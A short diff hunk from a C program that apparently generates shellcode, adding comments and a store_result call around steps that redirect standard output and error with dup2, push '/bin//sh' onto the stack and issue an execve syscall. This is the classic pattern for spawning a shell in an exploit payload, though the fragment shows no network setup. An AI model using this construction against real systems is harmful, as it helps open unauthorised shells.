@@ -390,9 +390,12 @@ int main(int argc, char * argv[])
     build_syscall2(SYS_dup2, SKIP_PARAM, STDOUT_FILENO);
     build_syscall2(SYS_dup2, SKIP_PARAM, STDERR_FILENO);
 
+    // Fail gracefully; just testing this function
     build_stackstring("This will fail");
 
+    // Store "/bin//sh" on the stack
     build_stackstring("/bin//sh");
+    store_result(esp, ebx);
 
     // execve("/bin//sh", NULL, NULL)
     build_syscall3(SYS_execve, SKIP_PARAM, 0, 0);
